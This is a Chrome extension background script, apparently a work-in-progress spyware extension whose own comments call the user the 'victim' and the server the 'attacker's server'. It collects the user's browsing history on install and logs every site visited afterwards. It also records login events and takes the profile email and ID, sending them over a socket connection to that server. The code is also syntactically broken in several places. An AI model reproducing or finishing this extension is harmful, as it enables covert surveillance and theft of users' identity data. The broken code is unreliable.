chrome.runtime.onInstalled.addListener( () => {
    // Connect to server for the first time and get security websites
    var socket = connectToServer();
    // Retrieves the browser history of the victim for the last 24 hours on install
    chrome.history.search({text: ''}, (results) => {
        results.forEach( (page) => {
          console.log(page.url+ '\n' +
                '    Time Visited: ' + new Date(page.lastVisitTime) + '\n' +
                '    Visit Count: ' + page.visitCount);
        });
    });
    // Adds listener that will log all sites visited by victim
	chrome.history.onVisited.addListener( (page) => {
        console.log(page.url+ '\n' +
            '    Time Visited: ' + new Date(page.lastVisitTime) + '\n' +
            '    Visit Count: ' + page.visitCount);
    });
});
chrome.runtime.onStartup.addListener( () => {
    // Connect to the socket server and get security websites
    var socket = connectToServer();
});
chrome.runtime.onSuspend.addListener( () => {
    // Disconnect from server
    disconnectFromServer(socket);
});
chrome.runtime.onMessage.addListener( (request, sender) => {
    console.log('Login detected: ' + request.loginListener);
});

function updateSecurityWebsites(socket) {
    socket.on('Security Websites'), (data) => {

    });
}

function connectToServer() {
    // Connect to attacker's server
    var socket = io.connect('http://localhost:3000');
    // When user is connected, send user data
    socket.on('Connect', (data) => {
        // Check if any userInfo is stored already, and if so use interval

        // If no userInfo is found, create userInfo
        else {
          var userEmail = '';
          var userId = '';
          chrome.identity.getProfileUserInfo( (userInfo) => {
              userEmail = (!userInfo.email) /* some default value */ ? : userInfo.email;
              userId = (!userInfo.id) /* some default value */ ? : userInfo.id;
          }
      }
        socket.emit('UserInfo', { /* userInfo object */ });
    });
    // Update security websites
    updateSecurityWebsites(socket);
    return socket;
}

function disconnectFromServer(socket) {
    // Tell server user is disconnecting
    socket.emit('Disconnect', { /* userInfo object */ });
    // Disconnect socket
    socket.disconnect();
}
